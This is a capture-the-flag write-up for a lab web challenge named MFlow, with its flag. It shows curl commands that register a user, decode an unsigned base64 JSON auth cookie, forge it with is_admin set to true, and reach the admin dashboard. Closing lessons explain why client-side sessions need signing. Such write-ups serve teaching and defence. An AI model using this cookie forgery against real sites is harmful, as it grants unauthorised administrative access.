# MFlow — web, very easy — 1000 pts

**Flag:** `HTB{s3ss10n_int3gritY_1s_n0t_t0_b3_m3ss3d_w1th_8aea04922677922b0b1b44aa8eda0bb1}`

> *"Unravel secrets hidden in plain sight and leverage your insights to climb to the top.
> Are you ready to manipulate the pieces and master the puzzle?"*

Black-box — no source handout.

---

## Step 1 — register and look at what you are given

```console
$ curl -s -i -X POST http://$HOST:$PORT/api/register \
       -H 'Content-Type: application/json' \
       -d '{"username":"zxq9","password":"zxq9pass"}'
...
Set-Cookie: auth=eyJ1c2VybmFtZSI6ICJ6eHE5IiwgImlzX2FkbWluIjogZmFsc2V9
```

That cookie is not opaque. Base64-decode it:

```json
{"username": "zxq9", "is_admin": false}
```

Plain base64 of a JSON object. **No signature, no MAC, no encryption** — just the server's
authorisation decision handed to the client in a format the client can rewrite. This is the
"hidden in plain sight" the description promises.

## Step 2 — flip the bit

```console
$ echo -n '{"username": "zxq9", "is_admin": true}' | base64 -w0
eyJ1c2VybmFtZSI6ICJ6eHE5IiwgImlzX2FkbWluIjogdHJ1ZX0=
```

Keep the exact spacing of the original (`": "` after each key) so the server's parser sees the same
shape it produced.

## Step 3 — collect

```console
$ curl -s http://$HOST:$PORT/dashboard \
       -H 'Cookie: auth=eyJ1c2VybmFtZSI6ICJ6eHE5IiwgImlzX2FkbWluIjogdHJ1ZX0='
... HTB{s3ss10n_int3gritY_1s_n0t_t0_b3_m3ss3d_w1th_8aea04922677922b0b1b44aa8eda0bb1} ...
```

---

## Note for the rest of the event

GoGoBuster (75270) serves an app with the **same title and skeleton**. That similarity is only skin
deep — GoGoBuster issues a properly Flask-signed `session` cookie and this attack does **not**
transfer. Do not assume shared chrome means a shared bug.

---

## Lessons

- **Base64 is an encoding, not a signature.** Any client-side session blob must be authenticated
  (`itsdangerous`, JWT with a verified signature, or a server-side session store keyed by an opaque ID).
- Decode every cookie before doing anything else. The entire challenge is visible in the first
  response.
- Preserve the original serialisation's whitespace and key order when tampering — some parsers are
  strict, and an unnecessary difference wastes a test cycle.
